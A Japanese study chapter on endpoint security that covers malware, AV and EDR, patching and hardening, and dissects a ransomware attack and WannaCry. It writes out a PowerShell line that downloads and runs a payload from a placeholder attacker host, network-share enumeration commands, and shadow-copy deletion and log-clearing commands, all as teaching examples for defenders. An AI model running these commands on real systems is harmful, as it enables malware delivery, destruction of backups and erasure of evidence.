# 04-endpoint: OS / エンドポイント層

ここから扱うのは「**端末そのもの**を守る話」。
これまでのネットワーク層 (TLS) やアプリ層 (XSS/CSRF) とは性質が異なるので、
最初に「なぜ Node で動かさないか」から書く。

> **実機で手を動かす場合の入り口**: 本章は概念中心。OS そのものを設定したり、別 OS と通信させたりする実機ハンズオンは [`infra-lessons`](../../infra-lessons/) で Ubuntu VM を使って扱う。パッチ配信・サービスのハードニング・証明書による配信認証などはそちらが現場。

---

## そもそもなぜこれまで Node を使ってきたのか / なぜここでは使わないのか

これまで Node を使ってきたのは、扱っていた攻撃が
**Webアプリのコード上で起きる現象** だったから。Node はちょうどそのレイヤーで動く道具。

| 章 | 攻撃が起きる場所 | Node が役立つ理由 |
|---|---|---|
| 01-network (TLS) | サーバーがHTTPレスポンスを返すコード | Node でHTTP/HTTPSサーバーを書ける |
| 02-app (XSS/CSRF) | 受け取った文字列・Cookieを処理するコード | Node でアプリの脆弱なコードを再現できる |

つまり「Webアプリの脆弱性 = Webアプリのコードで再現できる」という対応があったので、
Node が適任だった。

ところがエンドポイント層の攻撃は **OS のプロセス・ファイル・カーネル**で起きる:

- マルウェアが実行ファイルを書き込む
- カーネルの脆弱性で権限を奪う
- メモリを覗いて他プロセスのパスワードを抜く

これらは **Node プロセスの中では起きないし、Node から見える範囲にもない**。
本物のマルウェアは OS のシステムコールを直接叩いたり、署名されたドライバとして
読み込まれたりする。Node のスクリプトを書いて再現できる類の話ではない。

だからこの章では「**Node でコードを書いて動かす**」をやらない。攻撃の現場が違うので、
やろうとしても無理。代わりに「**OS が・AV が・EDR が何をやっているのか**」を理解するのが中心。

実機で動きを見たいときは、Node ではなく **OS 付属のツール** を使う:
- macOS の `Activity Monitor`, `log show`, `codesign -dv`
- Windows の `Defender`, `Event Viewer`, `Process Monitor (procmon)`
- Linux の `ps`, `lsof`, `auditd`, `dmesg`

## エンドポイントとは何か

**ネットワークの「端 (end)」にぶら下がっている端末そのもの**。

| 例 | エンドポイント? |
|---|---|
| ノートPC | はい |
| スマートフォン | はい |
| サーバー (オンプレ・クラウドVM) | はい |
| プリンタ、IoTカメラ、ATM | はい |
| ルーター、L3スイッチ | (ネットワーク機器扱いで別カテゴリ) |

要するに **「人が触る・データを生む・データを保管する」末端の機械全部**。
攻撃者にとっては「ここを乗っ取れば認証情報もデータもアプリも全部手に入る」場所。

「エンドポイントセキュリティ」と言われたら、**端末1台1台を守る話** と思えばよい。
ネットワーク全体を守るのは別の話 (ファイアウォール、IDS/IPS など)。

## OS / エンドポイント層で起きる攻撃の種類

ざっくり4つに分けて把握する。

### 1. マルウェア (悪意あるソフトウェア)

| 種類 | 何をする |
|---|---|
| ウイルス | 既存ファイルに寄生して増殖 |
| ワーム | 自力でネットワークを通って広がる |
| トロイの木馬 | 便利ソフトに偽装して入り込む |
| ランサムウェア | ファイルを暗号化して身代金要求 |
| スパイウェア / キーロガー | 入力やスクリーンを記録して送信 |
| ボット | 攻撃者の指令で動く端末群の1台になる |

入ってくる経路は「メール添付」「不正サイトのダウンロード」「USB」「正規ソフトのアップデートに混入(サプライチェーン攻撃)」など。

### 2. OS / カーネルの脆弱性悪用

OS 自体や標準コンポーネントのバグを突いて、本来の権限の枠を超える。

- **権限昇格 (Privilege Escalation)**: 一般ユーザーから root / SYSTEM に上がる
- **リモートコード実行 (RCE)**: ネットワーク越しに任意のコードを実行される
- **サンドボックスエスケープ**: ブラウザ等の制限環境から OS 本体に抜け出す

例: 古い Windows の SMB 脆弱性 (EternalBlue) を悪用した WannaCry (2017)。
パッチが出ていたのに当てていなかった端末が世界中で暗号化された。

### 3. 持続化 (Persistence) と痕跡隠し

侵入後に居続けるための仕掛け:

- スタートアップ / ログイン項目に登録
- スケジュールタスク / cron に仕込む
- カーネルモジュール / LaunchDaemon として常駐
- 正規プロセスにコードを注入 (プロセスインジェクション)
- ログを消す / 改ざんする

### 4. 物理 + OS の境界 (補助的)

- USB 経由のマルウェア持ち込み
- 鍵がかかっていないPCからの直接操作
- ブートディスクを差し替えてOSを跨いでファイルを読む

物理層に近いが、OS の防御 (FileVault / BitLocker のディスク暗号化、Secure Boot) と対になる。

## 守る側の仕組み

### 1. アンチウイルス (AV) — シグネチャ検出

「既知のマルウェアの指紋(ハッシュやコードパターン)」のデータベースを持っていて、
ファイルを開く・実行する瞬間にスキャンして一致したら止める。

- 利点: 既知のマルウェアには高い検出率
- 限界: **未知のマルウェア (zero-day) には弱い**
- 例: macOS の XProtect、Windows Defender、市販製品

### 2. EDR (Endpoint Detection and Response) — 振る舞い検出

「ファイルの中身が悪そう」ではなく「**プロセスが妙な動きをしている**」を検知する。

- PowerShell が突然ネットワーク接続して別バイナリを落とそうとした
- 普段ブラウザが触らないシステムファイルに書き込んだ
- 短時間に大量のファイルを暗号化し始めた (ランサムウェアの典型)

振る舞いから判定するので、未知のマルウェアにも反応しやすい。
発生したイベントはサーバーに集約され、SOC (運用部門) が分析する。

AVが「ドアの指紋認証」だとすると、EDRは「家の中の監視カメラ」。両方併用が普通。

### 3. パッチ管理

OS とソフトのアップデートを定期的に当てる。
ほとんどのRCE攻撃は **「既にパッチが出ているのに当てていない端末」** を狙う。
WannaCry も Equifax 侵害 (2017) もこれ。 **「パッチを当てる」だけで防げた攻撃が世の中の多数派**。

### 4. ハードニング (設定の強化)

OS のデフォルト設定を、攻撃者が利用しにくいように引き締める:

- 不要なサービスを止める
- 管理者権限を最小限のユーザーだけに
- リモートログイン (SSH/RDP) はキー認証 + IP制限
- ファイアウォールで不要なポートを閉じる
- Secure Boot / 署名検証を有効化

### 5. アプリケーション・アロウリスト

「実行してよいプログラム一覧」を作って、それ以外は OS が起動を拒否する。
macOS の `Gatekeeper` (署名済みアプリしか動かさない)、
Windows の `AppLocker` / `WDAC` がこれ。マルウェアが落ちてきても **実行できない**。

### 6. ディスク暗号化

紛失・盗難に備えて、ディスク全体を暗号化する。
鍵を持っている本人以外、別OSで起動してもファイルが読めない。

- macOS: **FileVault**
- Windows: **BitLocker**
- Linux: **LUKS**

## これまでの層との関係

これまで扱った層との位置関係:

```
[ユーザー]
   ↓ ブラウザを開く
   ┌────────────────────────────────────────┐
   │ Layer 7  アプリ層: XSS / CSRF / SQLi   │ ← 02-app
   │ Layer 6  TLS:      経路の暗号化          │ ← 01-network
   │ Layer 3-2 ネットワーク機器             │
   └────────────────────────────────────────┘
   ↓ 端末を物理的に操作する
[OS / エンドポイント]                       ← 04-endpoint (このディレクトリ)
   ├ プロセス、ファイル、カーネル
   ├ AV / EDR / パッチ / ハードニング
   └ ディスク暗号化
[ハードウェア / 物理]                       ← 06-physical-ops
```

XSS/CSRFを完璧に塞いでも、**端末がマルウェアに乗っ取られていれば、
本人がキー入力した時点で全部抜かれる**。逆に AV が完璧でも、Webアプリに
XSSがあれば普通に被害は出る。

**各層は独立して破られうる**ので、各層に対策が必要 (defense in depth)。
これは [where-security-breaks.md](../notes/where-security-breaks.md) で書いた話と同じ。

## 実機で確認するなら

「ここは Node で動かさない」と書いたが、自分のMacで実機の挙動を見たい場合の取っ掛かり。

### macOS

```bash
# 起動中プロセスを見る
ps aux

# ある実行ファイルがコード署名されているか
codesign -dv --verbose=4 /Applications/Safari.app

# システム整合性 (SIP) の状態
csrutil status

# XProtect のシグネチャ更新履歴
log show --predicate 'subsystem == "com.apple.xprotect"' --last 1h

# ファイアウォール状態
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
```

EICAR テスト文字列 (無害だが全AVが検出するテスト用文字列) をファイル化して
ダウンロードフォルダに置いてみると、XProtect が反応するのを観察できる。
ここで「**OSが標準で常時スキャンしている**」という事実を体感できる。

(EICAR を実際に試したい場合は別途相談してください。誤検知やシステム動作への影響があるため、
ここでは手順を書かずに概念のみ。)

### Windows

- `タスクマネージャー` → スタートアップタブ (持続化されているプログラム一覧)
- `Windows Defender` の設定 → 保護の履歴
- `イベントビューア` → セキュリティログ

### Linux

```bash
ps auxf                    # プロセスの親子関係込みで一覧
lsof -i                    # 開いているネットワーク接続
last                       # 直近のログイン履歴
sudo journalctl -u sshd    # SSH関連のシステムログ
```

## 実際に起こる例 (シナリオ)

### 例1: ランサムウェアによるファイル暗号化

```
1. 経理担当が「請求書.xlsm」を装ったフィッシングメールを開く
2. Office マクロが実行され、PowerShell が起動
3. PowerShell が攻撃者サーバーから本体バイナリをダウンロード
4. 本体が一斉にローカルとネットワーク共有のファイルを暗号化
5. 「身代金を払え」のメモがデスクトップに置かれる
```

ここで各層がどう関与するか:

| 層 | 何が効くか |
|---|---|
| メールゲートウェイ | 添付ファイルのマクロ検査・サンドボックス分析 |
| AV | 既知のランサム本体ならハッシュで止める。未知だと素通り |
| **EDR** | 「PowerShellが短時間に大量のファイルを書き換えている」を検知して止める |
| バックアップ | 暗号化されても復旧可能 (最後の砦) |

#### 例1の中で OS レベルでは何が起きているか

上の手順 2〜5 を「OS がどのシステムコールを呼ばれているか」の視点で開く。

##### Step 2: マクロから PowerShell 起動

Excel のマクロは VBA で書かれていて、本体は Office プロセス内で動く。
VBA はその中から `Shell()` や `WScript.Shell` 経由で外部プロセスを起動できる。

```
[ Excel.exe (Office マクロ実行) ]
   ↓ CreateProcess("powershell.exe", "-WindowStyle Hidden -EncodedCommand ...")
[ PowerShell.exe ]
```

OS から見ると **Excel が PowerShell を子プロセスとして生成** している。
これは EDR が真っ先に怪しがる挙動 (Office は普通 PowerShell を起動しない)。

##### Step 3: PowerShell が本体バイナリを取得

PowerShell の典型的なダウンローダ1行:

```powershell
(New-Object Net.WebClient).DownloadFile('https://攻撃者/loader.exe', "$env:TEMP\u.exe")
Start-Process "$env:TEMP\u.exe"
```

OS の動きを分解すると:

1. **ネットワーク接続**: PowerShell が `WinINet` API → カーネルの TCP/IP スタック経由で外部に HTTPS リクエスト
2. **ファイル書き込み**: `CreateFile()` → `WriteFile()` を呼んで `%TEMP%\u.exe` を保存
3. **プロセス起動**: `CreateProcess("u.exe")` で本体を立ち上げる

(最近は「ファイルを置かずに直接メモリに読み込んで実行 (fileless)」する手口も多い。
その場合は `Invoke-Expression` で文字列を直接実行する。)

##### Step 4: ファイル暗号化のループ

本体 (例: `u.exe`) は基本的にこれを高速ループでやっているだけ:

```
for each ドライブ in ローカル + ネットワーク共有:
  for each ファイル in そのドライブを再帰探索:
    if ファイル拡張子 が .docx, .xlsx, .pdf, .jpg, ... のいずれか:
      ① ファイルを開いて中身を読む       ← ReadFile()
      ② AES-256 で暗号化 (鍵はランダム生成)
      ③ 暗号化済みデータで上書き保存     ← WriteFile()
      ④ 拡張子を変更                     ← MoveFileEx() / SetFileInformation()
      (or 新規ファイル書き出し → 元ファイル削除 = DeleteFile())
```

ポイント:
- **暗号化に使う AES 鍵は端末側で乱数生成**。これがないとファイルを戻せない
- その AES 鍵を、攻撃者が事前に持つ **RSA 公開鍵で暗号化** して攻撃者だけが復号できる形にする
- 暗号化済み AES 鍵をファイル末尾や別ファイルに保存しておく
- 身代金を払うと攻撃者の RSA 秘密鍵で AES 鍵が復号され、被害者に渡される(という建前)

ファイルシステムの呼び出し回数は **数千〜数十万回**。これが EDR にとっての検知信号になる
(「短時間に異常なI/O頻度 + 拡張子書き換え」というパターン)。

##### ネットワーク共有を見つける方法

ローカルだけでなく、マウントされているネットワークドライブ (`Z:` など) も同じく
普通のファイルAPIでアクセスできる (OS が透過的にSMBにルーティングする)。
さらに未マウントの共有を列挙するには:

```powershell
Get-WmiObject -Class Win32_NetworkConnection   # 接続中のSMBマウントを取得
net view \\fileserver                          # 他端末の公開共有を列挙
```

WMI 経由で同一サブネットの端末を見つけ、開いている共有に `\\server\share\file.docx` の
パスで読み書き → 同じく暗号化、という流れ。これが「**1台感染すると組織全体が暗号化される**」
仕組みの中身。

##### Step 5: 身代金メモとデスクトップ表示

攻撃者がやることは2つ:

1. **メモファイルをばら撒く**
   ```
   for each ユーザーフォルダ (C:\Users\*\Desktop, Documents, ...):
     "README_DECRYPT.txt" を書き出す
   ```
   各フォルダに身代金支払先 (Bitcoin アドレス、Tor 上の連絡先) を書いたテキスト/HTMLを置く。
   普通のファイル書き込み (`WriteFile`)。

2. **デスクトップ壁紙を変更**
   ```
   ① 壁紙画像 (ransom_note.bmp) を %APPDATA% に書き出す
   ② レジストリ書き換え: HKCU\Control Panel\Desktop\Wallpaper = そのパス
   ③ SystemParametersInfo(SPI_SETDESKWALLPAPER, ...) を呼んで即時反映
   ```
   これでログイン中のユーザー画面が真っ赤な「PAY NOW」画像に切り替わる。

##### 追加でやられること (復旧妨害)

- `vssadmin delete shadows /all /quiet` ← Windowsのシャドウコピー削除 (簡易バックアップ消去)
- `bcdedit /set {default} recoveryenabled No` ← 回復モード起動を無効化
- `wevtutil cl Security` ← セキュリティイベントログ消去 (痕跡隠蔽)

ここまでが「ランサムウェア本体が OS に対して何をしているか」の解剖。
やっていることは **ファイルを読み書きする / プロセスを起動する / レジストリを書き換える**
という普通のシステム操作の組み合わせ。AV が止めにくいのはこのため (個別の操作は正規)。
EDR が止めるのは **「組み合わせ + 頻度」のパターン認識**。

### 例2: パッチ未適用による侵害 (WannaCry / 2017)

```
1. Microsoft が SMB の脆弱性 (MS17-010) を3月にパッチ公開
2. 5月、攻撃者が EternalBlue というエクスプロイトを使って未パッチ端末を一斉感染
3. 1台感染すると同一ネットワークの他端末へワーム的に伝播
4. 世界中で約20万台が暗号化された
```

教訓: **パッチが出てから当てるまでの「窓」が攻撃の機会**になる。
組織なら「公開から○日以内に適用」のルールが必要。

#### 例2の具体: 何の脆弱性で、何を直したか

##### 脆弱性の正体

- 識別子: **MS17-010** (Microsoft の月例パッチ番号)、CVE-2017-0143〜0148 (関連する CVE 群)
- 対象: Windows の **SMBv1 (Server Message Block バージョン1)** プロトコル実装
- ファイル: カーネルモードのドライバ `srv.sys`
- 関数: `SrvOs2FeaListSizeToNt()` 周辺
- バグの種類: **バッファサイズ計算の整数演算ミス → ヒープバッファオーバーフロー**

SMB はファイル共有プロトコル。Windows同士で `\\server\share\file.docx` のように
ファイルを開けるのはこれのおかげ。デフォルトで **TCP ポート 445** を待ち受けている。

問題は、SMBv1 が送られてきたパケットのサイズを計算する箇所で、
特殊な値を渡すと内部の整数演算が overflow し、
本来確保すべき領域より小さいバッファに、攻撃者が指定した長いデータを書き込めてしまう。
結果として **カーネル空間に攻撃者のコードを置いて実行できる**状態になる。

##### 攻撃者が得るもの

- **認証不要** (匿名で 445 ポートにパケット送るだけ)
- **リモートから** (LANでもWANでも届けば成立)
- **カーネル権限 (SYSTEM)** で任意コード実行

これが「最悪クラスの脆弱性」とされる組み合わせ (CVSS 9.3 / Critical)。
通常のアプリ権限ではなく、カーネル権限まで一気に取られる。

##### 攻略コード: EternalBlue

このバグを安定して悪用するコードが「EternalBlue」。
元々は NSA が秘密裏に保有していたエクスプロイト。
2017年4月に Shadow Brokers (ハッカー集団) がリークし、誰でも使える状態になった。

WannaCry はこの EternalBlue をそのまま組み込んで:

```
1. ランダムなIPに対して TCP 445 をスキャン
2. 反応した端末に EternalBlue で侵入 → カーネル権限を奪取
3. ランサムウェア本体を書き込んで実行
4. 暗号化開始 + さらに別端末をスキャン (ワーム化)
```

「メールを開く」「ファイルを開く」といったユーザー操作は **一切不要**。
ネットワークに繋がっていて、SMBv1 が有効で、パッチが当たっていない端末は
**接続されているだけで感染した**。

##### Microsoft のパッチ (MS17-010) が何を直したか

公開: **2017年3月14日**

主な変更内容:
1. **`srv.sys` の更新**
   - 問題のサイズ計算ロジックを修正 (整数オーバーフロー対策)
   - 不正な SMB パケットを早期に拒否するチェック追加
2. **同じ問題が複数の SMBv1 ハンドラに存在したため、関連箇所を一括修正**
   (CVE-2017-0143 から 0148 までまとめてカバー)
3. 例外的に **サポート終了済みの Windows XP / Server 2003 にも緊急パッチを後出し**
   (5月にWannaCryが流行し始めてから。本来サポート対象外)

##### 並行して推奨された対策 (パッチだけが対策ではない)

| 対策 | 内容 |
|---|---|
| **SMBv1 自体を無効化** | SMBv1 は1990年代の古いプロトコル。SMBv2/v3 で代替可能。新しい Windows ではデフォルト無効 |
| **ファイアウォールで 445/TCP を遮断** | インターネット側からのアクセスを止める (本来 445 をネットに公開する理由はない) |
| **ネットワーク分割** | LAN内でも、業務サーバーとクライアントの間に L3 セグメント切ってブロードキャストを止める |
| **SMB 署名要求** | 改ざんされたSMBパケットを弾く |

##### 実害

- 被害台数: 約20万台 / 150か国 (推定)
- 主な被害組織: 英国 NHS (病院運営に支障)、ロシア内務省、スペインの Telefonica、FedEx 他
- 被害金額: 推定 40〜80億ドル
- 鎮静化のきっかけ: セキュリティ研究者 Marcus Hutchins が **「キルスイッチドメイン」** を発見・登録したことで拡散が止まった (WannaCryは特定のドメインが解決できると停止する設計だった)
- 攻撃者帰属: 米国・英国の機関が **北朝鮮の Lazarus Group** に帰属を発表 (2017年12月)

##### この事例の教訓

| 項目 | 観点 |
|---|---|
| パッチ管理 | 公開から **2か月** で世界規模の侵害。組織のパッチ適用は数週間以内が現実的な目標 |
| 古いプロトコルの放置 | SMBv1 は当時すでに非推奨。「動いているから残している」が攻撃面になった |
| ネット境界の設計 | 445 がインターネットに露出している端末が多数存在した。FW/セグメントで防げた |
| 多層防御 | パッチに加えて、SMBv1無効化・FW遮断・バックアップ、すべてが活きる場面 |
| 国家がエクスプロイトを保有することの危険 | NSA保有のEternalBlueが漏洩 → 世界規模の被害。**「政府が脆弱性を発見しても秘匿せず公開すべき」議論 (Vulnerability Equities Process)** の文脈になった |

### 例3: 持続化 (Persistence) を仕込まれる

侵入したマルウェアが、再起動後も動き続けるための仕掛けを残す。
macOS の例:

```
~/Library/LaunchAgents/com.fake.updater.plist が勝手に作られている
→ ログインのたびに何かのバイナリが起動する状態
```

確認:

```bash
ls -la ~/Library/LaunchAgents/
ls -la /Library/LaunchAgents/ /Library/LaunchDaemons/
```

身に覚えのない `.plist` があったら要調査。

### 例4: EDR が捕まえる「妙な振る舞い」

EDR は個別の処理を見るのではなく **挙動の組み合わせ** を見る。代表例:

| 挙動 | なぜ怪しいか |
|---|---|
| Word が `cmd.exe` を起動した | 通常Wordはコマンドを起動しない。マクロ攻撃の特徴 |
| PowerShellが `-EncodedCommand` でBase64文字列を実行 | 中身を隠している = まともなスクリプトはやらない |
| ブラウザが `lsass.exe` のメモリを読もうとした (Win) | パスワード窃取の典型 (Mimikatz パターン) |
| 短時間に数千ファイルの拡張子を `.encrypted` 系に変更 | ランサムウェアの動作そのもの |
| `~/.ssh/id_rsa` を読んで外部に送信 | 秘密鍵の持ち出し |

これらは「単独だと正規操作の可能性もある」ので AV では止まらないが、
EDR は文脈で危険判定して通知 or 自動遮断する。

### 例5: ハードニングの実例 (SSH)

サーバーをインターネットに公開しているとき、デフォルト設定のままだと:

- root ログイン可能
- パスワード認証許可
- ポート 22 のまま

→ 24時間でブルートフォース攻撃のログが大量に来る。

ハードニング後:

```
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
Port 22 → 任意の高ポートに変更 (気休めだが効果あり)
AllowUsers 業務に必要なユーザーのみ
```

加えてホスト側ファイアウォール (`ufw` / `firewalld`) や
クラウドのセキュリティグループで送信元IPを制限する。

### 例6: AV検出の基本的な動き (EICAR で観察)

EICAR は「無害だが全AVが検出する標準テスト文字列」(EICAR.org 公式)。
端末にAVが入っているか・動いているかを **安全に確かめる** ための業界標準。

仕組み:
1. EICAR の文字列 (68バイトの ASCII) をファイルとして保存する
2. AV はファイル書き込みイベントを監視している
3. シグネチャDBに含まれる EICAR ハッシュと一致 → 検出・隔離

詳しい手順や試し方は別途相談 (誤検知通知や隔離処理が走るため、ここでは概念のみ)。

## まとめ

- エンドポイント = 端末そのもの (PC, スマホ, サーバー, IoT)
- 攻撃は OS のプロセス・ファイル・カーネル層で起きる → **Web アプリのコードでは防げない / Node では再現できない**
- 守る側の道具立て: **AV (既知マルウェア)** + **EDR (振る舞い)** + **パッチ** + **ハードニング** + **アロウリスト** + **ディスク暗号化**
- 単独では不十分。これまでの章 (TLS, アプリ層) と組み合わせて初めて意味がある
- 最大の効果が高いのは実は **パッチ管理** (出ているパッチを当てるだけで防げる攻撃が多数派)
